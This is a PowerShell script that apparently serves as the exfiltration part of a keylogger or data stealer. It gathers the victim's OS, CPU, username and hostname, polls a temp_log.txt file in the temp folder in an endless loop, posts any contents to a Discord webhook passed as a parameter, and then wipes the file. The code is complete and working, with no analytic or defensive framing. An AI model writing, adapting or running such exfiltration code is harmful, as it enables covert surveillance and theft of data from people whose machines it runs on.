param(
    [string]$dc  # Webhook URL passed as a parameter
)

# Define the webhook URL
$webhookURL = $dc

# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Get additional system info
$osInfo = Get-WmiObject -Class Win32_OperatingSystem
$cpuInfo = Get-WmiObject -Class Win32_Processor
$userInfo = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$hostname = $env:COMPUTERNAME

# Start an infinite loop to check the file every 5 seconds
while ($true) {
    # Pause for 5 seconds before checking
    Start-Sleep -Seconds 10

    # Check if the temp log file exists
    if (Test-Path $tempFilePath) {
        # Read the content of the log file
        $logContent = Get-Content $tempFilePath -Raw

        # Check if the log file has content
        if ($logContent) {
            # Get the current timestamp
            $timestamp = Get-Date -Format 'dd-MM-yyyy HH:mm:ss'

            # Create the message to send (content only as a string)
            $message = "$timestamp - $logContent`n`nSystem Information:`nOS: $($osInfo.Caption)`nCPU: $($cpuInfo.Name)`nUser: $userInfo`nHostname: $hostname"

            # Debugging: Print the message to ensure it's properly formatted
            Write-Host "Message to send:" -ForegroundColor Cyan
            Write-Host $message

            # Try to send the message to the Discord webhook
            try {
                # Send the content as a plain string
                $jsonPayload = @{ content = $message } | ConvertTo-Json
                $response = Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType 'application/json' -Body $jsonPayload
                Write-Host "Response from Discord:" -ForegroundColor Green
                Write-Host $response
            }
            catch {
                # Print detailed error message
                Write-Host "Error while sending message to webhook:" -ForegroundColor Red
                Write-Host $_.Exception.Message
            }

            # Clear the content of the temp log file after sending the data
            Clear-Content $tempFilePath
        }
        else {
            Write-Host "No content in log file" -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "Temp file not found at path: $tempFilePath" -ForegroundColor Yellow
    }
}
